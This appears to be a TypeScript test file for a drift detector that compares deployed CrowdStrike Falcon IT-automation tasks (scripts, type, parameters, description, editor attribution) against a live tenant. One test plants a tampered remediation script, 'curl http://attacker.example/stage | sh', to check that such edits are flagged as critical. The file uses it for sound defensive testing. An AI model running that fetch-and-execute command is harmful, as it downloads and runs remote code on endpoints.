// driftDetect for it-automation-tasks.
//
// The shared contract covers the invariants: drift never writes, a deleted task
// is critical drift, and a 500 is never reported as the task being gone. What is
// specific here is the comparison itself — the task type, the description, the
// CONTENT (the script or osquery that actually runs on the endpoint, hence
// critical) and the set of parameter keys.

import test from 'node:test'
import assert from 'node:assert/strict'
import driftDetect from '../driftDetect'
import {
  CLIENT_ID,
  TOKEN,
  driftContext,
  entityPage,
  idsPage,
  item,
  recordFetch,
  writeCalls,
} from '../../../lib/__tests__/fakeFalcon'
import { registerDriftContract } from '../../../lib/__tests__/falconContracts'

const SCRIPT_BODY = '#!/bin/sh\nrm -rf /tmp/stale/*'

const TASK = item('Clear stale temp files', {
  name: 'clear-stale-temp',
  description: 'Removes stale temp files older than 30 days',
  taskType: 'remediation',
  platforms: 'windows, linux',
  content: SCRIPT_BODY,
  parameters: JSON.stringify([{ key: 'maxAgeDays', input_type: 'number' }]),
})

registerDriftContract({ label: 'it-automation-tasks', handler: driftDetect, items: [TASK] })

/** The live task exactly matching the canvas, overridable field by field. */
const live = (over: Record<string, unknown> = {}) => ({
  id: 'task-live-1',
  name: 'clear-stale-temp',
  description: 'Removes stale temp files older than 30 days',
  task_type: 'remediation',
  remediations: { windows: { content: SCRIPT_BODY }, linux: { content: SCRIPT_BODY } },
  task_parameters: [{ key: 'maxAgeDays', input_type: 'number' }],
  ...over,
})

/** The two-call lookup every entity-adapter read performs: id query, then get. */
function lookup(entity: Record<string, unknown> | null) {
  return entity === null
    ? [TOKEN, { status: 200, body: { resources: [] } }]
    : [TOKEN, idsPage([String(entity.id)]), entityPage([entity])]
}

test('it-automation-tasks driftDetect: reports no drift when the tenant matches', async () => {
  const { calls, restore } = recordFetch(lookup(live()))
  try {
    const result = await driftDetect(driftContext([TASK]))

    assert.equal(result.hasDrift, false, `unexpected diffs: ${JSON.stringify(result.diffs)}`)
    assert.deepEqual(result.diffs, [])
    assert.equal(writeCalls(calls).length, 0)
  } finally {
    restore()
  }
})

test('it-automation-tasks driftDetect: reports a remediation script edited in the console as critical', async () => {
  // This field is the code that runs on every targeted endpoint — an edit here
  // is the single most consequential change this configuration can suffer.
  const { restore } = recordFetch(
    lookup(
      live({
        remediations: {
          windows: { content: 'curl http://attacker.example/stage | sh' },
          linux: { content: SCRIPT_BODY },
        },
      }),
    ),
  )
  try {
    const result = await driftDetect(driftContext([TASK]))

    assert.equal(result.hasDrift, true)
    const diff = result.diffs.find((d) => d.field === 'clear-stale-temp.content')
    assert.ok(diff, `expected a content diff, got ${JSON.stringify(result.diffs)}`)
    assert.equal(diff.severity, 'critical')
    assert.equal(diff.expected, SCRIPT_BODY)
  } finally {
    restore()
  }
})

test('it-automation-tasks driftDetect: reports a task retyped from remediation to query', async () => {
  const { restore } = recordFetch(lookup(live({ task_type: 'query', os_query: SCRIPT_BODY })))
  try {
    const result = await driftDetect(driftContext([TASK]))

    const diff = result.diffs.find((d) => d.field === 'clear-stale-temp.taskType')
    assert.ok(diff, `expected a taskType diff, got ${JSON.stringify(result.diffs)}`)
    assert.equal(diff.expected, 'remediation')
    assert.equal(diff.actual, 'query')
  } finally {
    restore()
  }
})

test('it-automation-tasks driftDetect: reports a parameter added in the console', async () => {
  const { restore } = recordFetch(
    lookup(live({ task_parameters: [{ key: 'maxAgeDays' }, { key: 'force' }] })),
  )
  try {
    const result = await driftDetect(driftContext([TASK]))

    const diff = result.diffs.find((d) => d.field === 'clear-stale-temp.parameters')
    assert.ok(diff, `expected a parameters diff, got ${JSON.stringify(result.diffs)}`)
    assert.equal(diff.expected, 'maxAgeDays')
    assert.equal(diff.actual, 'maxAgeDays, force')
  } finally {
    restore()
  }
})

test('it-automation-tasks driftDetect: ignores server-defaulted parameter fields', async () => {
  // Falcon fills in label/input_type defaults the canvas never declared;
  // comparing the whole parameter object would report drift on every run.
  const { restore } = recordFetch(
    lookup(live({ task_parameters: [{ key: 'maxAgeDays', label: 'Max age', default_value: '30' }] })),
  )
  try {
    const result = await driftDetect(driftContext([TASK]))

    assert.equal(result.hasDrift, false, `defaulted fields drifted: ${JSON.stringify(result.diffs)}`)
  } finally {
    restore()
  }
})

test('it-automation-tasks driftDetect: reports a description edited in the console as informational', async () => {
  const { restore } = recordFetch(lookup(live({ description: 'edited by hand' })))
  try {
    const result = await driftDetect(driftContext([TASK]))

    const diff = result.diffs.find((d) => d.field === 'clear-stale-temp.description')
    assert.ok(diff, `expected a description diff, got ${JSON.stringify(result.diffs)}`)
    assert.equal(diff.severity, 'info')
    assert.equal(diff.actual, 'edited by hand')
  } finally {
    restore()
  }
})

test('it-automation-tasks driftDetect: attributes a manual change to the operator who made it', async () => {
  const { restore } = recordFetch(
    lookup(
      live({
        task_type: 'query',
        modified_by: 'alice@acme.com',
        modified_timestamp: '2026-01-04T10:00:00Z',
      }),
    ),
  )
  try {
    const result = await driftDetect(driftContext([TASK]))

    const diff = result.diffs.find((d) => d.field === 'clear-stale-temp.taskType')
    assert.ok(diff)
    assert.equal(diff.actor?.email, 'alice@acme.com')
    assert.equal(diff.actor?.at, '2026-01-04T10:00:00Z')
    assert.equal(diff.actor?.source, 'crowdstrike-audit')
  } finally {
    restore()
  }
})

test('it-automation-tasks driftDetect: does not attribute drift to our own API client', async () => {
  // A change last written by the connection's own API client is a Veltrix
  // deploy, not a manual edit — reporting it as one sends an operator hunting.
  const { restore } = recordFetch(lookup(live({ task_type: 'query', modified_by: CLIENT_ID })))
  try {
    const result = await driftDetect(driftContext([TASK]))

    const diff = result.diffs.find((d) => d.field === 'clear-stale-temp.taskType')
    assert.ok(diff, 'the drift itself is still reported')
    assert.equal(diff.actor, undefined, 'our own deploy must not be attributed as a manual change')
  } finally {
    restore()
  }
})

test('it-automation-tasks driftDetect: reads the DEPLOYED config, not the current canvas', async () => {
  // Drift compares the tenant against what was last deployed. An edit the
  // operator has made on the canvas but not yet deployed is not drift.
  const edited = item('Clear stale temp files', {
    name: 'clear-stale-temp',
    description: 'Removes stale temp files older than 30 days',
    taskType: 'remediation',
    platforms: 'windows, linux',
    content: 'rm -rf /tmp/other',
    parameters: JSON.stringify([{ key: 'maxAgeDays', input_type: 'number' }]),
  })
  const { restore } = recordFetch(lookup(live()))
  try {
    const result = await driftDetect(driftContext([TASK], { canvasItems: [edited] }))

    assert.equal(result.hasDrift, false, `compared against the canvas: ${JSON.stringify(result.diffs)}`)
  } finally {
    restore()
  }
})
